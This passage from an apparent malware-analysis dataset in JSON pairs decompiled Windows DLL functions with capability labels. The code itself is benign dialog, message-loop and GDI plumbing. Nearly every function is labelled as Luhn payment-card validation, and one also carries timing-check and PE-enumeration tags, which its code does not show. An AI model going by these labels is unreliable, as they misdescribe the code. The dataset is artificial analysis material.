            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000fa8c(int64_t arg1)\n\n{\n    ulong *puVar1;\n    \n    for (puVar1 = *(arg1 + 8); puVar1 != NULL; puVar1 = *puVar1) {\n    }\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 8) = 0;\n    fcn.18002a100(*(arg1 + 0x28));\n    *(arg1 + 0x28) = 0;\n    return;\n}\n",
        "token_count": 146
    },
    "18000fca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000fcac(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    puVar3 = *(arg1 + 0x10);\n    iVar2 = 0;\n    do {\n        if (puVar3 == NULL) {\n            return iVar2;\n        }\n        piVar1 = puVar3[2];\n        puVar3 = *puVar3;\n    } while ((piVar1 == NULL) || (iVar2 = (**(*piVar1 + 8))(piVar1, arg2, arg3),  iVar2 == 0));\n    return iVar2;\n}\n",
        "token_count": 159
    },
    "18000fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000fe0c(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.18000fac8(arg1, 0, *(arg1 + 8));\n    *(iVar1 + 0x10) = arg2;\n    if (*(arg1 + 8) == 0) {\n        *(arg1 + 0x10) = iVar1;\n    }\n    else {\n        *(*(arg1 + 8) + 8) = iVar1;\n    }\n    *(arg1 + 8) = iVar1;\n    return;\n}\n",
        "token_count": 135
    },
    "18000fe5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18000fe50(int64_t arg1, int64_t arg2, ulong *arg3)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    \n    if (arg3 == NULL) {\n        arg3 = *(arg1 + 8);\n    }\n    else {\n        arg3 = *arg3;\n    }\n    while( true ) {\n        if (arg3 == NULL) {\n            return NULL;\n        }\n        if (arg3 + 2 == NULL) break;\n        if (arg3[2] == arg2) {\n            return arg3;\n        }\n        arg3 = *arg3;\n    }\n    fcn.180012514();\n    pcVar1 = swi(3);\n    puVar2 = (*pcVar1)();\n    return puVar2;\n}\n",
        "token_count": 177
    },
    "18000fed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000fed4(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.18000fac8(arg1, *(arg1 + 0x10), 0);\n    *(iVar1 + 0x10) = arg2;\n    if (*(arg1 + 0x10) == NULL) {\n        *(arg1 + 8) = iVar1;\n    }\n    else {\n        **(arg1 + 0x10) = iVar1;\n    }\n    *(arg1 + 0x10) = iVar1;\n    return;\n}\n",
        "token_count": 135
    },
    "18000ff1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000ff18(ulong noname_0, int64_t arg2, ulong pv)\n\n{\n    uint16_t uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    \n    if (*(arg2 + 0x98) != 0) {\n        puVar7 = *(*(arg2 + 0x98) + 0x88);\n        while (puVar7 != NULL) {\n            if (puVar7 == NULL) {\n                fcn.180012514();\n                pcVar4 = swi(3);\n                (*pcVar4)();\n                return;\n            }\n            iVar3 = puVar7[2];\n            puVar7 = *puVar7;\n            if (*(iVar3 + 8) != 0) {\n                for (iVar6 = *(*(iVar3 + 8) + 0xe0); iVar6 != 0; iVar6 = fcn.18001f25c(iVar6)) {\n                    fcn.18001f258(iVar6, *(iVar3 + 8));\n                    if (*(iVar6 + 8) != 0) {\n                        iVar5 = fcn.18001bcac(arg2, *(iVar6 + 8));\n                        fcn.180021d8c(iVar6, *(iVar5 + 0xa0));\n                    }\n                }\n                uVar1 = *(*(iVar3 + 8) + 0xe8);\n                if (uVar1 != 0) {\n                    iVar6 = fcn.18001bcac(arg2, uVar1);\n                    (**(**(iVar6 + 0xa0) + 0x168))();\n                    *(*(iVar3 + 8) + 0xe8) = *(iVar6 + 0xa0);\n                    piVar2 = *(*(iVar6 + 0xa0) + 0xd8);\n                    (**(*piVar2 + 0x10))(piVar2, *(iVar3 + 8), 1);\n                }\n            }\n        }\n        puVar7 = *(*(arg2 + 0x98) + 0x88);\n        while (puVar7 != NULL) {\n            if (puVar7 == NULL) {\n                fcn.180012514();\n                pcVar4 = swi(3);\n                (*pcVar4)();\n                return;\n            }\n            piVar2 = puVar7 + 2;\n            puVar7 = *puVar7;\n            iVar3 = *(*piVar2 + 8);\n            if ((iVar3 != 0) && (*(iVar3 + 0xd8) != 0)) {\n                (**(**(iVar3 + 0xd8) + 0x18))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 623
    },
    "18001011": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180010110(int64_t arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    if (arg2 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    iVar3 = fcn.18000fe50(arg1 + 8, arg2, 0);\n    if (iVar3 == 0) {\n        fcn.18000fe0c(arg1 + 8, arg2);\n    }\n    return 0;\n}\n",
        "token_count": 147
    },
    "18001030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010300(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    if (arg1 == 0) {\n        arg1 = fcn.18002878c(0x180069988, 0x180010154);\n        if (arg1 == 0) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    iVar2 = fcn.180014058();\n    *(iVar2 + 0x68) = arg1;\n    return;\n}\n",
        "token_count": 135
    },
    "180010ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180010ae8(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180013824();\n    return iVar1 + 0x58;\n}\n",
        "token_count": 44
    },
    "180010b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010b28(ulong arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.1800140a8();\n    piVar1 = *(iVar2 + 8);\n    if (piVar1 == NULL) {\n        fcn.180010afc(arg1, arg2);\n    }\n    else {\n        (**(*piVar1 + 0xd8))(piVar1, arg1, arg2);\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "180010b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010b70(int64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    *(arg1 + 0x40) = 0;\n    *(arg1 + 0x48) = 0;\n    *(arg1 + 0x58) = 0;\n    *(arg1 + 0x60) = 0;\n    iVar1 = fcn.180013824();\n    *(iVar1 + 0x60) = 0;\n    *(iVar1 + 0x90) = 0;\n    (*_sym.imp.USER32.dll_GetCursorPos)(iVar1 + 0x88);\n    *(arg1 + 0x80) = 0;\n    *(arg1 + 0x78) = 0;\n    *(arg1 + 0x50) = 1;\n    return;\n}\n",
        "token_count": 185
    },
    "180010e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010e98(ulong arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.1800140a8();\n    piVar1 = *(iVar2 + 8);\n    if (piVar1 == NULL) {\n        fcn.180010df4(arg1);\n    }\n    else {\n        (**(*piVar1 + 0xb0))(piVar1, arg1);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "180010ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180010ecc(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    iVar1 = *(arg1 + 8);\n    if ((iVar1 == 0x200) || (iVar1 == 0xa0)) {\n        iVar3 = fcn.180013824();\n        uVar2 = *(arg1 + 0x24);\n        if ((*(iVar3 + 0x88) == uVar2) && ((*(iVar3 + 0x8c) == uVar2 >> 0x20 && (*(arg1 + 8) == *(iVar3 + 0x90))))) {\n            return 0;\n        }\n        *(iVar3 + 0x88) = uVar2;\n        *(iVar3 + 0x90) = *(arg1 + 8);\n    }\n    else if ((iVar1 == 0xf) || (iVar1 == 0x118)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 229
    },
    "180010f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010f44(ulong arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.1800140a8();\n    piVar1 = *(iVar2 + 8);\n    if (piVar1 == NULL) {\n        fcn.180010ecc(arg1);\n    }\n    else {\n        (**(*piVar1 + 200))(piVar1, arg1);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "18001102": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180011028(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    \n    iVar2 = fcn.180013824();\n    uVar3 = (*_sym.imp.USER32.dll_GetMessageW)(iVar2 + 0x58, 0, 0, 0);\n    if (uVar3 != 0) {\n        if (*(iVar2 + 0x60) != 0x36a) {\n            iVar1 = fcn.180010e98(iVar2 + 0x58);\n            if (iVar1 == 0) {\n                (*_sym.imp.USER32.dll_TranslateMessage)(iVar2 + 0x58);\n                (*_sym.imp.USER32.dll_DispatchMessageW)(iVar2 + 0x58);\n            }\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 198
    },
    "18001108": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001108c(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.1800140a8();\n    if (*(iVar1 + 8) == NULL) {\n        fcn.180011028();\n    }\n    else {\n        (**(**(iVar1 + 8) + 0xb8))();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "1800113f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800113f4(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong arg2_00;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    if (arg2 == 0x110) {\n        arg2_00 = fcn.180017c7c(arg1);\n        piVar2 = fcn.18001c9e4(0x18004e778, arg2_00);\n        if (piVar2 == NULL) {\n            iVar3 = 1;\n        }\n        else {\n            iVar1 = (**(*piVar2 + 0x2a0))(piVar2);\n            iVar3 = iVar1;\n        }\n    }\n    else {\n        iVar3 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 181
    },
    "18001147": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180011478(ulong arg1)\n\n{\n    int32_t iVar1;\n    uchar auStack184 [32];\n    ulong uStack152;\n    uchar auStack136 [112];\n    uint64_t uStack24;\n    \n    uStack152 = 0xfffffffffffffffe;\n    uStack24 = *0x180067ce0 ^ auStack184;\n    fcn.180013168(auStack136, arg1);\n    iVar1 = fcn.18001bc84(arg1);\n    if (iVar1 == 0) {\n        fcn.180017b40(arg1);\n        fcn.1800131c8(auStack136);\n    }\n    else {\n        fcn.1800131c8(auStack136);\n    }\n    fcn.180032ea0(uStack24 ^ auStack184);\n    return;\n}\n",
        "token_count": 185
    },
    "18001158": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180011580(int64_t *arg1, ulong arg2)\n\n{\n    if ((*(arg1 + 0xf) & 0x18) != 0) {\n        (**(*arg1 + 0x118))(arg1, arg2 & 0xffffffff);\n    }\n    // WARNING: Could not recover jumptable at 0x0001800115b2. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.USER32.dll_EndDialog)(arg1[8], arg2);\n    return;\n}\n",
        "token_count": 124
    },
    "1800117c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800117c0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.180014058();\n    uVar2 = 0;\n    if (*(iVar1 + 8) != 0) {\n        fcn.18000ee28(*(iVar1 + 8), 0);\n    }\n    if (*(arg1 + 0xd0) != 0) {\n        uVar2 = *(*(arg1 + 0xd0) + 0x40);\n    }\n    uVar2 = fcn.18000ed24(uVar2, arg1 + 0xd8);\n    fcn.180019f48(arg1);\n    return uVar2;\n}\n",
        "token_count": 165
    },
    "18001181": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001181c(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    \n    fcn.180017d54();\n    fcn.180017d08(arg1);\n    iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(arg1 + 0xd8));\n    if (iVar2 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(*(arg1 + 0xd8), 1);\n    }\n    *(arg1 + 0xd8) = 0;\n    iVar1 = fcn.180014058();\n    if (*(iVar1 + 8) != 0) {\n        fcn.18000ee28(*(iVar1 + 8), 1);\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "1800119f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800119f4(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t hWnd;\n    \n    if (*(arg1 + 200) == 0) {\n        iVar1 = fcn.18001bbb0(arg1, *(arg1 + 0xb0));\n    }\n    else {\n        iVar1 = fcn.18001b5c0(arg1, *(arg1 + 200));\n    }\n    if ((iVar1 != 0) && (iVar1 = fcn.180017288(arg1, 0),  iVar1 != 0)) {\n        hWnd = fcn.18001bcac(arg1, 0xe146);\n        if (hWnd != 0) {\n            iVar1 = fcn.18001196c();\n            fcn.18001be78(hWnd, -(iVar1 != 0) & 5);\n        }\n        return 1;\n    }\n    fcn.180011580(arg1, 0xffffffff);\n    return 0;\n}\n",
        "token_count": 222
    },
    "180011bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.180011bb8(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    ushort auStackX32 [4];\n    int64_t iStack128;\n    int64_t iStack120;\n    int64_t *piStack112;\n    uchar auStack104 [24];\n    ulong uStack80;\n    uchar auStack72 [32];\n    \n    uStack80 = 0xfffffffffffffffe;\n    iVar8 = 0;\n    if (arg4 == 0) {\n        iVar5 = fcn.180014058();\n        arg4 = *(iVar5 + 0x18);\n    }\n    iVar5 = fcn.180014058();\n    piVar2 = *(iVar5 + 0x68);\n    iStack120 = 0;\n    piStack112 = piVar2;\n    fcn.18001b7b0(0x10);\n    fcn.18001b7b0(0xfc000);\n    fcn.18001843c();\n    if (piVar2 != NULL) {\n        iVar4 = (**(*arg1 + 0x268))(arg1, auStack72);\n        if (iVar4 == 0) {\n            return 0;\n        }\n        arg2 = (**(*piVar2 + 0x28))(piVar2, auStack72, arg2);\n    }\n    if (arg2 == 0) {\n        uVar7 = 0;\n    }\n    else {\n        piVar6 = fcn.180012330();\n        if (piVar6 == NULL) {\n            fcn.180001214(0x80004005);\n            pcVar3 = swi(3);\n            uVar7 = (*pcVar3)();\n            return uVar7;\n        }\n        iStack128 = (**(*piVar6 + 0x18))(piVar6);\n        iStack128 = iStack128 + 0x18;\n        auStackX32[0] = 0;\n        iVar4 = fcn.18002cf8c(arg2, &iStack128, auStackX32);\n        iVar5 = iVar8;\n        if (iVar4 == 0) {\n            fcn.18002cf40(auStack104, arg2);\n            fcn.18002ce38(auStack104);\n            iVar5 = fcn.18002ca54(auStack104);\n            fcn.18002ca3c(auStack104);\n            if (iVar5 != 0) {\n                arg2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar5);\n            }\n        }\n        *(arg1 + 0x11) = 0xffffffff;\n        *(arg1 + 0xf) = *(arg1 + 0xf) | 0x10;\n        fcn.180019f48(arg1);\n        if (arg3 != 0) {\n            iVar8 = *(arg3 + 0x40);\n        }\n        iVar8 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamW)(arg4, arg2, iVar8, fcn.1800113f4, 0);\n        LOCK();\n        piVar1 = iStack128 + -8;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        iStack120 = iVar8;\n        if (iVar4 + -1 < 1) {\n            (**(**(iStack128 + -0x18) + 8))();\n        }\n        if ((piVar2 != NULL) && (iVar8 != 0)) {\n            (**(*piVar2 + 0x30))(piVar2, auStack72);\n            (**(*arg1 + 0x268))(arg1, 0);\n        }\n        iVar4 = fcn.180017d54();\n        if (iVar4 == 0) {\n            (**(*arg1 + 0x238))(arg1);\n        }\n        if ((iVar8 != 0) && ((*(arg1 + 0xf) & 0x10) == 0)) {\n            (*_sym.imp.USER32.dll_DestroyWindow)(iVar8);\n            iVar8 = 0;\n        }\n        if (iVar5 != 0) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar5);\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(iVar5);\n        }\n        uVar7 = iVar8 != 0;\n    }\n    return uVar7;\n}\n",
        "token_count": 1037
    },
    "1800120c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1800120c4(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    ushort uStackX32;\n    int64_t in_stack_00000028;\n    int64_t iStack128;\n    int64_t iStack120;\n    int64_t *piStack112;\n    uchar auStack104 [24];\n    ulong uStack80;\n    uchar auStack72 [24];\n    ulong uStack48;\n    \n    if (arg3 == 0) {\n        uStack48 = 0x1800120e9;\n        piVar8 = fcn.180010ad4();\n        if (piVar8 == NULL) {\n            arg3 = 0;\n        }\n        else {\n            uStack48 = 0x1800120fb;\n            arg3 = (**(*piVar8 + 0xe8))(piVar8);\n        }\n    }\n    arg1[0x19] = arg4;\n    uStack80 = 0xfffffffffffffffe;\n    iVar7 = 0;\n    if (in_stack_00000028 == 0) {\n        iVar4 = fcn.180014058();\n        in_stack_00000028 = *(iVar4 + 0x18);\n    }\n    iVar4 = fcn.180014058();\n    piVar8 = *(iVar4 + 0x68);\n    iStack120 = 0;\n    piStack112 = piVar8;\n    fcn.18001b7b0(0x10);\n    fcn.18001b7b0(0xfc000);\n    fcn.18001843c();\n    if (piVar8 != NULL) {\n        iVar3 = (**(*arg1 + 0x268))(arg1, &stack0xffffffffffffffb8);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        arg2 = (**(*piVar8 + 0x28))(piVar8, &stack0xffffffffffffffb8, arg2);\n    }\n    if (arg2 == 0) {\n        uVar6 = 0;\n    }\n    else {\n        piVar5 = fcn.180012330();\n        if (piVar5 == NULL) {\n            fcn.180001214(0x80004005);\n            pcVar2 = swi(3);\n            uVar6 = (*pcVar2)();\n            return uVar6;\n        }\n        iStack128 = (**(*piVar5 + 0x18))(piVar5);\n        iStack128 = iStack128 + 0x18;\n        uStackX32 = 0;\n        iVar3 = fcn.18002cf8c(arg2, &stack0xffffffffffffff80, &stack0x00000020);\n        iVar4 = iVar7;\n        if (iVar3 == 0) {\n            fcn.18002cf40(&stack0xffffffffffffff98, arg2);\n            fcn.18002ce38(&stack0xffffffffffffff98);\n            iVar4 = fcn.18002ca54(&stack0xffffffffffffff98);\n            fcn.18002ca3c(&stack0xffffffffffffff98);\n            if (iVar4 != 0) {\n                arg2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar4);\n            }\n        }\n        *(arg1 + 0x11) = 0xffffffff;\n        *(arg1 + 0xf) = *(arg1 + 0xf) | 0x10;\n        fcn.180019f48(arg1);\n        if (arg3 != 0) {\n            iVar7 = *(arg3 + 0x40);\n        }\n        iVar7 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamW)(in_stack_00000028, arg2, iVar7, fcn.1800113f4, 0);\n        LOCK();\n        piVar1 = iStack128 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        iStack120 = iVar7;\n        if (iVar3 + -1 < 1) {\n            (**(**(iStack128 + -0x18) + 8))();\n        }\n        if ((piVar8 != NULL) && (iVar7 != 0)) {\n            (**(*piVar8 + 0x30))(piVar8, &stack0xffffffffffffffb8);\n            (**(*arg1 + 0x268))(arg1, 0);\n        }\n        iVar3 = fcn.180017d54();\n        if (iVar3 == 0) {\n            (**(*arg1 + 0x238))(arg1);\n        }\n        if ((iVar7 != 0) && ((*(arg1 + 0xf) & 0x10) == 0)) {\n            (*_sym.imp.USER32.dll_DestroyWindow)(iVar7);\n            iVar7 = 0;\n        }\n        if (iVar4 != 0) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar4);\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(iVar4);\n        }\n        uVar6 = iVar7 != 0;\n    }\n    return uVar6;\n}\n",
        "token_count": 1194
    },
    "18001222": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.180012228(uint64_t arg1, ushort *arg2, ulong arg3)\n\n{\n    ulong arg1_00;\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint16_t *puVar4;\n    uint64_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if ((arg2 == NULL) || (arg3 == 0)) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar5 = (*pcVar1)();\n        return uVar5;\n    }\n    iVar3 = fcn.180014058();\n    arg1_00 = *(iVar3 + 0x18);\n    iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(arg1_00, ((arg1 & 0xffffffff) >> 4) + 1);\n    if ((iVar3 != 0) && (puVar4 = fcn.18000122c(arg1_00, iVar3, arg1 & 0xffffffff),  puVar4 != NULL)) {\n        uVar6 = arg3 - 1;\n        uVar7 = *puVar4;\n        if (uVar6 < *puVar4) {\n            uVar7 = uVar6;\n        }\n        iVar2 = fcn.180034220(arg2, uVar6 * 2, puVar4 + 1, uVar7 * 2);\n        if (iVar2 != 0) {\n            if (iVar2 == 0xc) {\n                fcn.1800124cc();\n                pcVar1 = swi(3);\n                uVar5 = (*pcVar1)();\n                return uVar5;\n            }\n            if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                uVar5 = (*pcVar1)();\n                return uVar5;\n            }\n            if (iVar2 != 0x50) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                uVar5 = (*pcVar1)();\n                return uVar5;\n            }\n        }\n        arg2[uVar7] = 0;\n        return uVar7;\n    }\n    *arg2 = 0;\n    return 0;\n}\n",
        "token_count": 527
    },
    "18001231": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001231c(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180014058();\n    return *(iVar1 + 0x18);\n}\n",
        "token_count": 43
    },
    "18001249": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.180012494(int64_t arg1)\n\n{\n    int32_t iVar1;\n    \n    *(arg1 + 0x14) = 1;\n    iVar1 = fcn.180012228(*(arg1 + 0x11c), arg1 + 0x1c, 0x80);\n    *(arg1 + 0x18) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 92
    },
    "180012c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180012c80(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    \n    uVar2 = 0;\n    uVar1 = uVar2;\n    if (*(arg1 + 8) != *(arg1 + 0x10)) {\n        if (arg2 != 0) {\n            uVar1 = *(arg2 + 8);\n        }\n        uVar1 = (*_sym.imp.GDI32.dll_ExtSelectClipRgn)(*(arg1 + 8), uVar1);\n    }\n    if (*(arg1 + 0x10) != 0) {\n        if (arg2 != 0) {\n            uVar2 = *(arg2 + 8);\n        }\n        uVar1 = (*_sym.imp.GDI32.dll_ExtSelectClipRgn)(*(arg1 + 0x10), uVar2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 218
    },
    "180012cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012cf4(int64_t hdc, uint *arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint32_t uStackX8;\n    uint32_t uStackX12;\n    uint32_t uStackX16;\n    uint32_t uStackX20;\n    \n    (*_sym.imp.GDI32.dll_GetWindowExtEx)(*(hdc + 0x10), &uStackX8);\n    (*_sym.imp.GDI32.dll_GetViewportExtEx)(*(hdc + 0x10), &uStackX16);\n    uVar1 = fcn.1800362f4(uStackX8);\n    uVar2 = fcn.1800362f4(uStackX16);\n    uVar1 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg2, uVar2, uVar1);\n    *arg2 = uVar1;\n    uVar1 = fcn.1800362f4(uStackX12);\n    uVar2 = fcn.1800362f4(uStackX20);\n    uVar1 = (*_sym.imp.KERNEL32.dll_MulDiv)(arg2[1], uVar2, uVar1);\n    arg2[1] = uVar1;\n    return;\n}\n",
        "token_count": 281
    },
    "180012d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012d78(int64_t hdc, uint *arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint32_t uStackX8;\n    uint32_t uStackX12;\n    uint32_t uStackX16;\n    uint32_t uStackX20;\n    \n    (*_sym.imp.GDI32.dll_GetWindowExtEx)(*(hdc + 0x10), &uStackX16);\n    (*_sym.imp.GDI32.dll_GetViewportExtEx)(*(hdc + 0x10), &uStackX8);\n    uVar1 = fcn.1800362f4(uStackX8);\n    uVar2 = fcn.1800362f4(uStackX16);\n    uVar1 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg2, uVar2, uVar1);\n    *arg2 = uVar1;\n    uVar1 = fcn.1800362f4(uStackX12);\n    uVar2 = fcn.1800362f4(uStackX20);\n    uVar1 = (*_sym.imp.KERNEL32.dll_MulDiv)(arg2[1], uVar2, uVar1);\n    arg2[1] = uVar1;\n    return;\n}\n",
        "token_count": 281
    },
    "180012e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
